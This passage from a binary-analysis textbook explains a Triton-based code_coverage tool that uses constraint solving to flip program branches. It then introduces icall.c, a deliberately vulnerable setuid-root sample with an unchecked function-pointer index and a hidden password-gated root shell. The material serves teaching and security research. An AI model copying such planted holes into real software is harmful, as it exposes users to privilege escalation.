<p class="noindent">Because the backward slicing example needed only Triton’s ability to track symbolic expressions for registers and memory locations, it didn’t use symbolic execution’s core strength: reasoning about program properties through constraint solving. In this example, you’ll get acquainted with Triton’s constraint-solving abilities in the classic symbex use case of <em>code coverage</em>.</p>&#13;
<p class="indent"><a href="ch13.xhtml#ch13list6">Listing 13-6</a> shows the first part of the source of the <span class="literal">code_coverage</span> tool. You’ll notice that a lot of the source is the same as or similar to that of the previous example. In fact, I’ve omitted the <span class="literal">set_triton_arch</span> function from the listing because it’s exactly the same as in the <span class="literal">backward_slicing</span> tool.</p>&#13;
<p class="listing1" id="ch13list6"><em>Listing 13-6:</em> code_coverage.cc</p>&#13;
<p class="programs">   #include "../inc/loader.h"<br/>   #include "triton_util.h"<br/>   #include "disasm_util.h"<br/><br/>   #include &lt;triton/api.hpp&gt;<br/>   #include &lt;triton/x86Specifications.hpp&gt;<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     Binary bin;<br/>     triton::API api;<br/>     triton::arch::registers_e ip;<br/>     std::map&lt;triton::arch::registers_e, uint64_t&gt; regs;<br/>     std::map&lt;uint64_t, uint8_t&gt; mem;<br/>     std::vector&lt;triton::arch::registers_e&gt; symregs;<br/>     std::vector&lt;uint64_t&gt; symmem;<br/><br/>     if(argc &lt; 5) {<br/>       printf("Usage: %s &lt;binary&gt; &lt;sym-config&gt; &lt;entry&gt; &lt;branch-addr&gt;\n", argv[0]);<br/>       return 1;<br/>   }<br/><br/>   std::string fname(argv[1]);<br/>   if(load_binary(fname, &amp;bin, Binary::BIN_TYPE_AUTO) &lt; 0) return 1;<br/><br/>   if(set_triton_arch(bin, api, ip) &lt; 0) return 1;<br/>   api.enableMode(triton::modes::ALIGNED_MEMORY, true);<br/><br/><span class="ent">➊</span>  if(parse_sym_config(argv[2], &amp;regs, &amp;mem, &amp;symregs, &amp;symmem) &lt; 0) return 1;<br/>    for(auto &amp;kv: regs) {<br/>      triton::arch::Register r = api.getRegister(kv.first);<br/>      api.setConcreteRegisterValue(r, kv.second);<br/>   }<br/><span epub:type="pagebreak" id="page_347"/><span class="ent">➋</span>  for(auto regid: symregs) {<br/>     triton::arch::Register r = api.getRegister(regid);<br/>     api.convertRegisterToSymbolicVariable(r)-&gt;setComment(r.getName());<br/>   }<br/>   for(auto &amp;kv: mem) {<br/>     api.setConcreteMemoryValue(kv.first, kv.second);<br/>   }<br/><span class="ent">➌</span>  for(auto memaddr: symmem) {<br/>     api.convertMemoryToSymbolicVariable(<br/>         triton::arch::MemoryAccess(memaddr, 1))-&gt;setComment(std::to_string(memaddr));<br/>   }<br/><br/>    uint64_t pc          = strtoul(argv[3], NULL, 0);<br/>    uint64_t branch_addr = strtoul(argv[4], NULL, 0);<br/>    Section *sec = bin.get_text_section();<br/><br/><span class="ent">➍</span>  while(sec-&gt;contains(pc)) {<br/>      char mnemonic[32], operands[200];<br/>      int len = disasm_one(sec, pc, mnemonic, operands);<br/>      if(len &lt;= 0) return 1;<br/><br/>      triton::arch::Instruction insn;<br/>      insn.setOpcode(sec-&gt;bytes+(pc-sec-&gt;vma), len);<br/>      insn.setAddress(pc);<br/><br/>      api.processing(insn);<br/><br/><span class="ent">➎</span>    if(pc == branch_addr) {<br/>        find_new_input(api, sec, branch_addr);<br/>        break;<br/>      }<br/><br/>      pc = (uint64_t)api.getConcreteRegisterValue(api.getRegister(ip));<br/>    }<br/><br/>    unload_binary(&amp;bin);<br/><br/>    return 0;<br/>  }</p>&#13;
<p class="indent">To use the <span class="literal">code_coverage</span> tool, you supply command line arguments specifying the binary to analyze, a symbolic configuration file, the entry point address for the analysis, and the address of a direct branch instruction. The tool assumes that your symbolic configuration file contains concrete inputs that cause the branch to take one of the two possible paths (it doesn’t matter <span epub:type="pagebreak" id="page_348"/>which path). It then uses the constraint solver to compute a model containing a new set of concrete inputs that will cause the branch to go the other way. For the solver to succeed, you must take care to symbolize all the registers and memory locations that the branch you want to flip depends on.</p>&#13;
<p class="indent">As you can see in the listing, <span class="literal">code_coverage</span> includes the same utility and Triton header files as the previous example. Moreover, the <span class="literal">main</span> function of <span class="literal">code_coverage</span> is almost identical to the <span class="literal">main</span> function of <span class="literal">backward_slicing</span>. As in that example, it starts by loading the binary and configuring the Triton architecture and then enables the <span class="literal">ALIGNED_MEMORY</span> optimization.</p>&#13;
<h4 class="h4" id="ch13_4_1"><em>13.4.1 Creating Symbolic Variables</em></h4>&#13;
<p class="noindent">A difference between this and the previous example is that the code that parses the symbolic configuration file passes two optional arguments (<span class="literal">symregs</span> and <span class="literal">symmem</span>) <span class="ent">➊</span> to <span class="literal">parse_sym_config</span>. These are output arguments where <span class="literal">parse _sym_config</span> writes the lists of registers and memory locations to symbolize according to the configuration file. In the configuration file, you’ll want to symbolize all registers and memory locations that contain user inputs so that the model the constraint solver returns will give you a concrete value for each of those user inputs.</p>&#13;
<p class="indent">After assigning the concrete values from the configuration file, <span class="literal">main</span> loops over the list of registers to symbolize and symbolizes them using Triton’s <span class="literal">api.convertRegisterToSymbolicVariable</span> function <span class="ent">➋</span>. The same line of code that symbolizes the register immediately sets a comment on the just-created symbolic variable, specifying the register’s human-readable name. That way, when you later get a model from the constraint solver, you’ll know how to map the symbolic variable assignments in the model back onto the real registers and memory.</p>&#13;
<p class="indent">The loop that symbolizes memory locations is similar. For each memory location to symbolize, it builds a <span class="literal">triton::arch::MemoryAccess</span> object, which specifies the address and size (in bytes) of the memory location. In this case, I’ve hardcoded the size to 1 byte because the configuration file format allows you to reference memory locations only at byte granularity. To symbolize the address specified in a <span class="literal">MemoryAccess</span> object, you use the Triton function <span class="literal">api.convertMemoryToSymbolicVariable</span> <span class="ent">➌</span>. After that, the loop sets a comment mapping the new symbolic variable to a human-readable string containing the memory address.</p>&#13;
<h4 class="h4" id="ch13_4_2"><em>13.4.2 Finding a Model for a New Path</em></h4>&#13;
<p class="noindent">The emulation loop <span class="ent">➍</span> is the same as in <span class="literal">backward_slicing</span>, except that this time it emulates until <span class="literal">pc</span> is equal to the address of the branch for which you want to find a new set of inputs <span class="ent">➎</span>. To find these new inputs, <span class="literal">code_coverage</span> calls a separate function named <span class="literal">find_new_input</span>, which is shown in <a href="ch13.xhtml#ch13list7">Listing 13-7</a>.</p>&#13;
<p class="listing1" id="ch13list7"><span epub:type="pagebreak" id="page_349"/><em>Listing 13-7:</em> code_coverage.cc <em>(continued)</em></p>&#13;
<p class="programs">   static void<br/>   find_new_input(triton::API &amp;api, Section *sec, uint64_t branch_addr)<br/>   {<br/><span class="ent">➊</span>   triton::ast::AstContext &amp;ast = api.getAstContext();<br/><span class="ent">➋</span>   triton::ast::AbstractNode *constraint_list = ast.equal(ast.bvtrue(), ast.bvtrue());<br/>   <br/>     printf("evaluating branch 0x%jx:\n", branch_addr);<br/><br/><span class="ent">➌</span>   const std::vector&lt;triton::engines::symbolic::PathConstraint&gt; &amp;path_constraints<br/>         = api.getPathConstraints();<br/><span class="ent">➍</span>   for(auto &amp;pc: path_constraints) {<br/><span class="ent">➎</span>     if(!pc.isMultipleBranches()) continue;<br/><span class="ent">➏</span>     for(auto &amp;branch_constraint: pc.getBranchConstraints()) {<br/>        bool flag         = std::get&lt;0&gt;(branch_constraint);<br/>        uint64_t src_addr = std::get&lt;1&gt;(branch_constraint);<br/>        uint64_t dst_addr = std::get&lt;2&gt;(branch_constraint);<br/>        triton::ast::AbstractNode *constraint = std::get&lt;3&gt;(branch_constraint);<br/><br/><span class="ent">➐</span>      if(src_addr != branch_addr) {<br/>          /* this is not our target branch, so keep the existing "true" constraint */<br/><span class="ent">➑</span>        if(flag) {<br/>            constraint_list = ast.land(constraint_list, constraint);<br/>         }<br/><span class="ent">➒</span>     } else {<br/>        /* this is our target branch, compute new input */<br/>        printf("    0x%jx -&gt; 0x%jx (%staken)\n",<br/>               src_addr, dst_addr, flag ? "" : "not ");<br/><br/><span class="ent">➓</span>      if(!flag) {<br/>          printf("    computing new input for 0x%jx -&gt; 0x%jx\n",<br/>                src_addr, dst_addr);<br/>          constraint_list = ast.land(constraint_list, constraint);<br/>          for(auto &amp;kv: api.getModel(constraint_list)) {<br/>            printf("      SymVar %u (%s) = 0x%jx\n",<br/>                  kv.first,<br/>                  api.getSymbolicVariableFromId(kv.first)-&gt;getComment().c_str(),<br/>                  (uint64_t)kv.second.getValue());<br/>          }<br/>        }<br/>      }<br/>    }<br/>  }<br/>}</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_350"/>To find inputs that reach the previously unexplored branch direction, <span class="literal">find_new_input</span> feeds the solver the list of constraints that must be satisfied to reach the desired branch and then asks it for a model that satisfies those constraints. Recall that Triton represents constraints as abstract syntax trees, so to encode branch constraints, you need to build a corresponding AST. That’s why <span class="literal">find_new_input</span> starts by calling <span class="literal">api.getAstContext</span> to get a reference (called <span class="literal">ast</span>) to an <span class="literal">AstContext</span> <span class="ent">➊</span>, which is Triton’s builder class for AST formulas.</p>&#13;
<p class="indent">To store the list of constraints that will model the path leading to the unexplored branch direction, <span class="literal">find_new_input</span> uses a <span class="literal">triton::ast::AbstractNode</span> object, reachable through a pointer called <span class="literal">constraint_list</span> <span class="ent">➋</span>. <span class="literal">AbstractNode</span> is Triton’s class for representing AST nodes. To initialize <span class="literal">constraint_list</span>, you set it to the formula <span class="literal">ast.equal(ast.bvtrue(), ast.bvtrue())</span>, meaning the logical tautology <span class="literal">true == true</span>, where each <span class="literal">true</span> is a bitvector. This is just a way of initializing the constraint list to a syntactically valid formula that doesn’t impose any constraints and to which you can easily concatenate additional constraints.</p>&#13;
<h5 class="h5">Copying and Flipping Branch Constraints</h5>&#13;
<p class="noindent">Next, <span class="literal">find_new_input</span> calls <span class="literal">api.getPathConstraints</span> to get the list of path constraints that Triton has accumulated while emulating the code <span class="ent">➌</span>. The list takes the form of a <span class="literal">std::vector</span> of <span class="literal">triton::engines::symbolic::PathConstraint</span> objects, where each <span class="literal">PathConstraint</span> is associated with one branch instruction. This list contains all the constraints that must be satisfied to take the just-emulated path. To turn this into a list of constraints for a new path, you copy all the constraints except the one for the branch you want to change, which you flip to the other branch direction.</p>&#13;
<p class="indent">To implement this, <span class="literal">find_new_input</span> loops over the list of path constraints <span class="ent">➍</span> and copies or flips each one. Inside each <span class="literal">PathConstraint</span>, Triton stores one or more <em>branch constraints</em>, one for each possible branch direction. In the context of code coverage, you’re interested only in multiway branches such as conditional jumps because single-way branches like direct calls or unconditional jumps don’t have any new direction to explore. To determine whether a <span class="literal">PathConstraint</span> called <span class="literal">pc</span> represents a multiway branch, you call <span class="literal">pc.isMultipleBranches</span> <span class="ent">➎</span>, which returns <span class="literal">true</span> if the branch is multiway.</p>&#13;
<p class="indent">For <span class="literal">PathConstraint</span> objects that contain multiple branch constraints, <span class="literal">find _new_input</span> gets all the branch constraints by calling <span class="literal">pc.getBranchConstraints</span> and then loops over each constraint in the list <span class="ent">➏</span>. Each constraint is a tuple of a Boolean flag, a source and destination address (both <span class="literal">triton::uint64</span>), and an AST encoding the branch constraint. The flag denotes whether the branch direction represented by the branch constraint was taken during the emulation. For example, consider the following conditional branch:</p>&#13;
<p class="programs">4055dc:       3c 25                    cmp     al,0x25<br/> 4055de:       0f 8d f4 00 00 00        jge     4056d8</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_351"/>When emulating the <span class="literal">jge</span>, Triton creates a <span class="literal">PathConstraint</span> object with two branch constraints. Let’s assume that the first branch constraint represents the <em>taken</em> direction of the <span class="literal">jge</span> (that is, the direction that’s taken if the condition holds) and that this is the direction taken during the emulation. That means the first branch constraint stored in the <span class="literal">PathConstraint</span> has a <span class="literal">true</span> flag (because it was taken during the emulation), and the source and destination addresses will be <span class="literal">0x4055de</span> (the address of the <span class="literal">jge</span>) and <span class="literal">0x4056d8</span> (the target of the <span class="literal">jge</span>), respectively. The AST for this branch condition will encode the condition <span class="literal">al</span> ≥ <span class="literal">0x25</span>. The second branch constraint has a <span class="literal">false</span> flag, representing the branch direction that wasn’t taken during emulation. The source and destination addresses are <span class="literal">0x4055de</span> and <span class="literal">0x4055e4</span> (the fallthrough address of the <span class="literal">jge</span>), and the AST encodes the condition <span class="literal">al</span> &lt; <span class="literal">0x25</span> (or more precisely, <span class="literal">not(al</span> ≥ <span class="literal">0x25)</span>).</p>&#13;
<p class="indent">Now, for each <span class="literal">PathConstraint</span>, <span class="literal">find_new_input</span> copies the branch constraint whose flag is <span class="literal">true</span>, except for the <span class="literal">PathConstraint</span> associated with the branch instruction you want to flip, for which it instead copies the <span class="literal">false</span> branch constraint, thereby inverting that branch decision. To recognize the branch to flip, <span class="literal">find_new_input</span> uses the branch source address. For constraints with a source address unequal to the address of the branch to invert <span class="ent">➐</span>, it copies the branch constraint with the <span class="literal">true</span> flag <span class="ent">➑</span> and appends it to the <span class="literal">constraint_list</span> using a logical AND, implemented with <span class="literal">ast.land</span>.</p>&#13;
<h5 class="h5">Getting a Model from the Constraint Solver</h5>&#13;
<p class="noindent">Finally, <span class="literal">find_new_input</span> will encounter the <span class="literal">PathConstraint</span> associated with the branch you want to flip. It contains multiple branch constraints whose source address is equal to the address of the branch to flip <span class="ent">➒</span>. To clearly show all possible branch directions in <span class="literal">code_coverage</span>’s output, <span class="literal">find_new_input</span> prints each branch condition with a matching source address, regardless of its flag.</p>&#13;
<p class="indent">If the flag is <span class="literal">true</span>, then <span class="literal">find_new_input</span> <em>doesn’t</em> append the branch constraint to the <span class="literal">constraint_list</span> because it corresponds to the branch direction you’ve already explored. However, if the flag is <span class="literal">false</span> <span class="ent">➓</span>, it represents the unexplored branch direction, so <span class="literal">find_new_input</span> appends this branch constraint to the constraint list and passes the list to the constraint solver by calling <span class="literal">api.getModel</span>.</p>&#13;
<p class="indent">The <span class="literal">getModel</span> function invokes the constraint solver Z3 and asks it for a model that satisfies the list of constraints. If a model is found, <span class="literal">getModel</span> returns it as a <span class="literal">std::map</span> that maps Triton symbolic variable identifiers to <span class="literal">triton::engines::solver::SolverModel</span> objects. The model represents a new set of concrete inputs to the analyzed program that will cause the program to take the previously unexplored branch direction. If no model is found, the returned map is empty.</p>&#13;
<p class="indent">Each <span class="literal">SolverModel</span> object contains the concrete value that the constraint solver assigned to the corresponding symbolic variable in the model. The <span class="literal">code_coverage</span> tool reports the model to the user by looping over the map and printing each symbolic variable’s ID and comment, which contains the human-readable name of the corresponding register or memory <span epub:type="pagebreak" id="page_352"/>location, as well as the concrete value assigned in the model (as returned by <span class="literal">SolverModel::getValue</span>).</p>&#13;
<p class="indent">To see how to use the output of <span class="literal">code_coverage</span> in practice, let’s now try it on a test program to find and use new inputs to cover a branch of your choice.</p>&#13;
<h4 class="h4" id="ch13_4_3"><em>13.4.3 Testing the Code Coverage Tool</em></h4>&#13;
<p class="noindent"><a href="ch13.xhtml#ch13list8">Listing 13-8</a> shows a simple test program that you can use to try the ability of <span class="literal">code_coverage</span> to generate inputs that explore a new branch direction.</p>&#13;
<p class="listing1" id="ch13list8"><em>Listing 13-8:</em> branch.c</p>&#13;
<p class="programs">   #include &lt;stdio.h&gt;<br/>   #include &lt;stdlib.h&gt;<br/><br/>   void<br/>   branch(int x, int y)<br/>   {<br/><span class="ent">➊</span>   if(x &lt; 5) {<br/><span class="ent">➋</span>     if(y == 10) printf("x &lt; 5 &amp;&amp; y == 10\n");<br/>       else        printf("x &lt; 5 &amp;&amp; y != 10\n");<br/>     } else {<br/>       printf("x &gt;= 5\n");<br/>     }<br/>   }<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     if(argc &lt; 3) {<br/>       printf("Usage: %s &lt;x&gt; &lt;y&gt;\n", argv[0]);<br/>       return 1;<br/>     }<br/><br/><span class="ent">➌</span>   branch(strtol(argv[1], NULL, 0), strtol(argv[2], NULL, 0));<br/><br/>     return 0;<br/>   }</p>&#13;
<p class="indent">As you can see, the <span class="literal">branch</span> program contains a function called <span class="literal">branch</span>, which takes two integers called <span class="literal">x</span> and <span class="literal">y</span> as input. The <span class="literal">branch</span> function contains an outer <span class="literal">if</span>/<span class="literal">else</span> branch based on the value of <span class="literal">x</span> <span class="ent">➊</span> and a nested <span class="literal">if</span>/<span class="literal">else</span> branch based on <span class="literal">y</span> <span class="ent">➋</span>. The function is called by <span class="literal">main</span> with the <span class="literal">x</span> and <span class="literal">y</span> arguments being supplied from user input <span class="ent">➌</span>.</p>&#13;
<p class="indent">Let’s first run <span class="literal">branch</span> with <span class="literal">x = 0</span> and <span class="literal">y = 0</span> so that the outer branch takes the <span class="literal">if</span> direction and the nested branch takes the <span class="literal">else</span> direction. Then you can use <span class="literal">code_coverage</span> to find inputs to flip the nested branch so it takes the <span epub:type="pagebreak" id="page_353"/><span class="literal">if</span> direction. But first, let’s build the symbolic configuration file needed to run <span class="literal">code_coverage</span>.</p>&#13;
<h5 class="h5">Building a Symbolic Configuration File</h5>&#13;
<p class="noindent">To use <span class="literal">code_coverage</span>, you need a symbolic configuration file, and to make that, you need to know which registers and memory locations the compiled version of <span class="literal">branch</span> uses. <a href="ch13.xhtml#ch13list9">Listing 13-9</a> shows the disassembly of the <span class="literal">branch</span> function. Let’s analyze it to find out which registers and memory locations <span class="literal">branch</span> uses.</p>&#13;
<p class="listing1" id="ch13list9"><em>Listing 13-9: Disassembly excerpt from</em> ~/code/chapter13/branch</p>&#13;
<p class="programs">   <span class="codestrong1">$ objdump -M intel -d ./branch</span><br/>   ...<br/>   00000000004005b6 &lt;branch&gt;:<br/>     4005b6:  55               push   rbp<br/>     4005b7:  48 89 e5         mov    rbp,rsp<br/>     4005ba:  48 83 ec 10      sub    rsp,0x10<br/><span class="ent">➊</span>   4005be:  89 7d fc         mov    DWORD PTR [rbp-0x4],edi<br/><span class="ent">➋</span>   4005c1:  89 75 f8         mov    DWORD PTR [rbp-0x8],esi<br/><span class="ent">➌</span>   4005c4:  83 7d fc 04      cmp    DWORD PTR [rbp-0x4],0x4<br/><span class="ent">➍</span>   4005c8:  7f 1e            jg     4005e8 &lt;branch+0x32&gt;<br/><span class="ent">➎</span>   4005ca:  83 7d f8 0a      cmp    DWORD PTR [rbp-0x8],0xa<br/><span class="ent">➏</span>   4005ce:  75 0c            jne    4005dc &lt;branch+0x26&gt;<br/>     4005d0:  bf 04 07 40 00   mov    edi,0x400704<br/>     4005d5:  e8 96 fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005da:  eb 16            jmp    4005f2 &lt;branch+0x3c&gt;<br/>     4005dc:  bf 15 07 40 00   mov    edi,0x400715<br/>     4005e1:  e8 8a fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005e6:  eb 0a            jmp    4005f2 &lt;branch+0x3c&gt;<br/>     4005e8:  bf 26 07 40 00   mov    edi,0x400726<br/>     4005ed:  e8 7e fe ff ff   call   400470 &lt;puts@plt&gt;<br/>     4005f2:  c9               leave<br/>     4005f3:  c3               ret<br/>   ...</p>&#13;
<p class="indent">The Ubuntu installation on the VM uses the x64 version of the System V <em>application binary interface (ABI)</em>, which dictates the <em>calling convention</em> used on the system. In the System V calling convention for x64 systems, the first and second arguments to a function call are stored in the <span class="literal">rdi</span> and <span class="literal">rsi</span> registers, respectively.<sup><a id="ch13fn_6a" href="footnote.xhtml#ch13fn_6">6</a></sup> In this case, this means you’ll find the <span class="literal">x</span> parameter of the <span class="literal">branch</span> function in <span class="literal">rdi</span> and the <span class="literal">y</span> parameter in <span class="literal">rsi</span>. Internally, the <span class="literal">branch</span> function immediately moves <span class="literal">x</span> to the memory location <span class="literal">rbp-0x4</span> <span class="ent">➊</span> and <span class="literal">y</span> to <span class="literal">rbp-0x8</span> <span class="ent">➋</span>. Then <span class="literal">branch</span> compares the first memory location containing <span class="literal">x</span> <span epub:type="pagebreak" id="page_354"/>against the value 4 <span class="ent">➌</span>, followed by a <span class="literal">jg</span> at address <span class="literal">0x4005c8</span>, which implements the outer <span class="literal">if</span>/<span class="literal">else</span> branch <span class="ent">➍</span>.</p>&#13;
<p class="indent">The <span class="literal">jg</span>’s target address <span class="literal">0x4005e8</span> contains the <span class="literal">else</span> case (<span class="literal">x</span> ≥ <span class="literal">5</span>), while the fallthrough address <span class="literal">0x4005ca</span> contains the <span class="literal">if</span> case. Inside the <span class="literal">if</span> case is the nested <span class="literal">if</span>/<span class="literal">else</span> branch, which is implemented as a <span class="literal">cmp</span> that compares <span class="literal">y</span>’s value to 10 (<span class="literal">0xa</span>) <span class="ent">➎</span>, followed by a <span class="literal">jne</span> that jumps to <span class="literal">0x4005dc</span> if <span class="literal">y</span> ≠ 10 <span class="ent">➏</span> (the nested <span class="literal">else</span>) or falls through to <span class="literal">0x4005d0</span> otherwise (the nested <span class="literal">if</span> case).</p>&#13;
<p class="indent">Now that you know which registers contain the <span class="literal">x</span> and <span class="literal">y</span> inputs and the address <span class="literal">0x4005ce</span> of the nested branch you want to flip, let’s make the symbolic configuration file. <a href="ch13.xhtml#ch13list10">Listing 13-10</a> shows the configuration file to use for the test.</p>&#13;
<p class="listing1" id="ch13list10"><em>Listing 13-10:</em> branch.map</p>&#13;
<p class="programs"><span class="ent">➊</span> %rdi=$<br/>  %rdi=0<br/><span class="ent">➋</span> %rsi=$<br/>  %rsi=0</p>&#13;
<p class="indent">The configuration file makes <span class="literal">rdi</span> (representing <span class="literal">x</span>) symbolic and assigns it the concrete value 0 <span class="ent">➊</span>. It does the same for <span class="literal">rsi</span>, which contains <span class="literal">y</span> <span class="ent">➋</span>. Because <span class="literal">x</span> and <span class="literal">y</span> are both symbolic, when you generate a model for the new inputs, the constraint solver will give you concrete values for both <span class="literal">x</span> and <span class="literal">y</span>.</p>&#13;
<h5 class="h5">Generating a New Input</h5>&#13;
<p class="noindent">Recall that the symbolic configuration file assigns the value 0 to both <span class="literal">x</span> and <span class="literal">y</span>, creating a baseline from which <span class="literal">code_coverage</span> can generate a new input that covers a different path. When you run the <span class="literal">branch</span> program with these baseline inputs, it prints the message <span class="literal">x &lt; 5 &amp;&amp; y != 10</span>, as shown in the following listing:</p>&#13;
<p class="programs"><span class="codestrong1">$ ./branch 0 0</span><br/>x &lt; 5 &amp;&amp; y != 10</p>&#13;
<p class="indent">Let’s now use <span class="literal">code_coverage</span> to generate new inputs that flip the nested <span class="literal">branch</span> that checks y’s value so that you can use these new inputs to run branch again and get the output x &lt; 5 &amp;&amp; y == 10 instead. <a href="ch13.xhtml#ch13list11">Listing 13-11</a> shows how to do that.</p>&#13;
<p class="listing1" id="ch13list11"><em>Listing 13-11: Finding inputs to take the alternative branch at</em> <span class="codeitalic">0x4005ce</span></p>&#13;
<p class="programs"><span class="ent">➊</span> <span class="codestrong1">$ ./code_coverage branch branch.map 0x4005b6 0x4005ce</span><br/>   evaluating branch 0x4005ce:<br/><span class="ent">➋</span>      0x4005ce -&gt; 0x4005dc (taken)<br/><span class="ent">➌</span>      0x4005ce -&gt; 0x4005d0 (not taken)<br/><span class="ent">➍</span>      computing new input for 0x4005ce -&gt; 0x4005d0<br/><span class="ent">➎</span>        SymVar 0 (rdi) = 0x0<br/>          SymVar 1 (rsi) = 0xa</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_355"/>You call <span class="literal">code_coverage</span> giving the <span class="literal">branch</span> program as input, as well as the symbolic configuration file you made (<span class="literal">branch.map</span>), the start address <span class="literal">0x4005b6</span> of the <span class="literal">branch</span> function (the entry point for the analysis), and the address <span class="literal">0x4005ce</span> of the nested branch to flip <span class="ent">➊</span>.</p>&#13;
<p class="indent">When the emulation hits that branch address, <span class="literal">code_coverage</span> evaluates and prints each of the branch constraints that Triton generated as part of the <span class="literal">PathConstraint</span> associated with the branch. The first constraint is for the branch direction with target address <span class="literal">0x4005dc</span> (the nested <span class="literal">else</span>), and this direction is taken during the emulation because of the concrete input values you specified in the configuration file <span class="ent">➋</span>. As <span class="literal">code_coverage</span> reports, the fallthrough branch direction with destination address <span class="literal">0x4005d0</span> (the nested <span class="literal">if</span> case) is not taken <span class="ent">➌</span>, so <span class="literal">code_coverage</span> tries to compute new input values that lead to that branch direction <span class="ent">➍</span>.</p>&#13;
<p class="indent">Although in general the constraint solving required to find the new input values can take a while, it should complete in only a few seconds for constraints as simple as this case. Once the solver finds a model, <span class="literal">code_coverage</span> prints it to screen <span class="ent">➎</span>. As you can see, the model assigns the concrete value 0 to <span class="literal">rdi</span> (<span class="literal">x</span>) and the value <span class="literal">0xa</span> to <span class="literal">rsi</span> (<span class="literal">y</span>).</p>&#13;
<p class="indent">Let’s run the <span class="literal">branch</span> program with these new inputs to see whether they cause the nested branch to flip.</p>&#13;
<p class="programs">$<span class="codestrong1"> ./branch 0 0xa</span><br/>x &lt; 5 &amp;&amp; y == 10</p>&#13;
<p class="indent">With these new inputs, <span class="literal">branch</span> prints the output <span class="literal">x &lt; 5 &amp;&amp; y == 10</span>, not the message <span class="literal">x &lt; 5 &amp;&amp; y != 10</span> that you got in the previous run of the <span class="literal">branch</span> program. The inputs generated by <span class="literal">code_coverage</span> successfully flipped the direction of the nested branch!</p>&#13;
<h3 class="h3" id="ch13_5">13.5 Automatically Exploiting a Vulnerability</h3>&#13;
<p class="noindent">Now let’s look at an example that requires more complex constraint solving than the previous example. In this section, you’ll learn to use Triton to automatically generate inputs that exploit a vulnerability in a program by hijacking an indirect call site and redirecting it to an address of your choice.</p>&#13;
<p class="indent">Let’s assume that you already know there’s a vulnerability that allows you to control the call site’s target, but you don’t yet know how to exploit it to reach the address you want because the target address is computed from the user inputs in a nontrivial way. This is a situation you may encounter in real life during fuzzing, for example.</p>&#13;
<p class="indent">As you learned in <a href="ch12.xhtml#ch12">Chapter 12</a>, symbolic execution is too computationally expensive for a brute-force fuzzing approach that tries to find an exploit for every indirect call site in a program. Instead, you can optimize by first fuzzing the program in a more traditional way, supplying it with many pseudorandomly generated inputs and using taint analysis to determine whether these inputs affect dangerous program state, such as indirect call sites. Then, you can use symbolic execution to generate exploits only for <span epub:type="pagebreak" id="page_356"/>those call sites that the taint analysis has revealed to be potentially controllable. This is the use case I assume in the following example.</p>&#13;
<h4 class="h4" id="ch13_5_1"><em>13.5.1 The Vulnerable Program</em></h4>&#13;
<p class="noindent">First, let’s take a look at the program to exploit and the vulnerable call site it contains. <a href="ch13.xhtml#ch13list12">Listing 13-12</a> shows the vulnerable program’s source file <em>icall.c</em>. The <em>Makefile</em> compiles the program into a <span class="literal">setuid root</span> binary<sup><a id="ch13fn_7a" href="footnote.xhtml#ch13fn_7">7</a></sup> called <span class="literal">icall</span> that contains an indirect call site that calls one of several handler functions. This is similar to how web servers like <span class="literal">nginx</span> use function pointers to choose an appropriate handler for the data they receive.</p>&#13;
<p class="listing1" id="ch13list12"><em>Listing 13-12:</em> icall.c</p>&#13;
<p class="programs">   #include &lt;stdio.h&gt;<br/>   #include &lt;stdlib.h&gt;<br/>   #include &lt;string.h&gt;<br/>   #include &lt;unistd.h&gt;<br/>   #include &lt;crypt.h&gt;<br/><br/>   void forward (char *hash);<br/>   void reverse (char *hash);<br/>   void hash    (char *src, char *dst);<br/><br/><span class="ent">➊</span> static struct {<br/>     void (*functions[2])(char *);<br/>     char hash[5];<br/>   } icall;<br/><br/>   int<br/>   main(int argc, char *argv[])<br/>   {<br/>     unsigned i;<br/><br/><span class="ent">➋</span>   icall.functions[0] = forward;<br/>     icall.functions[1] = reverse;<br/><br/>     if(argc &lt; 3) {<br/>       printf("Usage: %s &lt;index&gt; &lt;string&gt;\n", argv[0]);<br/>       return 1;<br/>     }<br/><br/><span class="ent">➌</span>    if(argc &gt; 3 &amp;&amp; !strcmp(crypt(argv[3], "$1$foobar"), "$1$foobar$Zd2XnPvN/dJVOseI5/5Cy1")) {<br/>        /* secret admin area */<br/><span epub:type="pagebreak" id="page_357"/>        if(setgid(getegid())) perror("setgid");<br/>        if(setuid(geteuid())) perror("setuid");<br/>        execl("/bin/sh", "/bin/sh", (char*)NULL);<br/><span class="ent">➍</span>    } else {<br/><span class="ent">➎</span>      hash(argv[2], icall.hash);<br/><span class="ent">➏</span>      i = strtoul(argv[1], NULL, 0);<br/><br/>        printf("Calling %p\n", (void*)icall.functions[i]);<br/><span class="ent">➐</span>      icall.functions[i](icall.hash);<br/>     }<br/><br/>     return 0;<br/>   }<br/><br/>   void<br/>   forward(char *hash)<br/>   {<br/>     int i;<br/><br/>     printf("forward: ");<br/>     for(i = 0; i &lt; 4; i++) {<br/>       printf("%02x", hash[i]);<br/>    }<br/>    printf("\n");<br/>   }<br/><br/>   void<br/>   reverse(char *hash)<br/>   {<br/>     int i;<br/><br/>     printf("reverse: ");<br/>     for(i = 3; i &gt;= 0; i--) {<br/>       printf("%02x", hash[i]);<br/>     }<br/>     printf("\n");<br/>   }<br/><br/>   void<br/>   hash(char *src, char *dst)<br/>   {<br/>     int i, j;<br/><br/>     for(i = 0; i &lt; 4; i++) {<br/>       dst[i] = 31 + (char)i;<br/>       for(j = i; j &lt; strlen(src); j += 4) {<br/>         dst[i] ˆ= src[j] + (char)j;<br/><span epub:type="pagebreak" id="page_358"/>         if(i &gt; 1) dst[i] ˆ= dst[i-2];<br/>       }<br/>     }<br/>     dst[4] = '\0';<br/>   }</p>&#13;
